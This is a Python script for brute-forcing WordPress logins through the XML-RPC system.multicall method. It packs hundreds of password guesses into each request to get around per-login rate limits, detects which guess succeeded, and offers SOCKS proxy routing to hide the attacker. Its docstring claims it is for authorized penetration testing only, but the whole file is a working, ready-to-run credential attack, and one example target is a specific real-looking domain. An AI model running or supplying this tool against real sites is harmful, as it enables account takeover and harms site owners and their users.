#!/usr/bin/env python3
"""
WordPress XML-RPC Multicall Brute Force
For authorized penetration testing only.
Usage: python3 xmlrpc_brute.py <target_url> <username> <wordlist> [--proxy socks5://host:port]
"""

import requests
import argparse
import sys
from itertools import islice
 
CHUNK_SIZE = 500  # passwords per request
TIMEOUT = 30
 
def build_multicall_xml(username: str, passwords: list[str]) -> str:
    calls = ""
    for password in passwords:
        # Escape XML special characters
        password = password.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        calls += f"""
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>{username}</string></value>
        <value><string>{password}</string></value>
      </data></array></value></member>
    </struct></value>"""
 
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    {calls}
  </data></array></value></param></params>
</methodCall>"""
 
 
def chunks(lst, n):
    it = iter(lst)
    while True:
        chunk = list(islice(it, n))
        if not chunk:
            break
        yield chunk
 
 
def parse_args():
    parser = argparse.ArgumentParser(description="WordPress XML-RPC multicall brute forcer")
    parser.add_argument("url",      help="Target URL (e.g. https://site.ticketasa.gt)")
    parser.add_argument("username", help="WordPress username to attack")
    parser.add_argument("wordlist", help="Path to wordlist file")
    parser.add_argument("--proxy",  help="Proxy URL (e.g. socks5://10.16.0.61:9050)", default=None)
    parser.add_argument("--chunk-size", type=int, default=CHUNK_SIZE, help=f"Passwords per request (default: {CHUNK_SIZE})")
    return parser.parse_args()
 
 
def main():
    args = parse_args()
 
    target = args.url.rstrip("/") + "/xmlrpc.php"
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
 
    print(f"[*] Target   : {target}")
    print(f"[*] Username : {args.username}")
    print(f"[*] Wordlist : {args.wordlist}")
    print(f"[*] Proxy    : {args.proxy or 'none'}")
    print(f"[*] Chunk    : {args.chunk_size} passwords/request")
    print("-" * 60)
 
    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {args.wordlist}")
        sys.exit(1)
 
    total = len(passwords)
    total_chunks = (total + args.chunk_size - 1) // args.chunk_size
    print(f"[*] Loaded {total} passwords → {total_chunks} requests\n")
 
    tested = 0
    for i, chunk in enumerate(chunks(passwords, args.chunk_size), 1):
        payload = build_multicall_xml(args.username, chunk)
 
        try:
            resp = requests.post(
                target,
                data=payload,
                headers={"Content-Type": "text/xml"},
                proxies=proxies,
                timeout=TIMEOUT,
            )
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error on chunk {i}: {e}")
            continue
 
        tested += len(chunk)
        print(f"[{i}/{total_chunks}] Tested {tested}/{total} passwords...", end="\r")
 
        # A successful login returns <array> with blog info, not a <fault>
        if "<isAdmin>" in resp.text or "<blogName>" in resp.text:
            # Find which password worked by checking individual responses
            responses = resp.text.split("<value><struct>")
            for j, r in enumerate(responses[1:], 0):  # skip first split artifact
                if "<isAdmin>" in r or "<blogName>" in r:
                    found_password = chunk[j] if j < len(chunk) else "unknown"
                    print(f"\n\n[!!!] PASSWORD FOUND: {found_password}")
                    print(f"[!!!] Username: {args.username}")
                    print(f"[!!!] URL: {target}")
                    sys.exit(0)
 
        # Optional: detect if server started blocking us
        if resp.status_code == 429:
            print(f"\n[!] Rate limited on chunk {i}. Server is blocking us.")
            sys.exit(1)
 
    print(f"\n\n[-] Password not found in {total} attempts.")
 
 
if __name__ == "__main__":
    main()
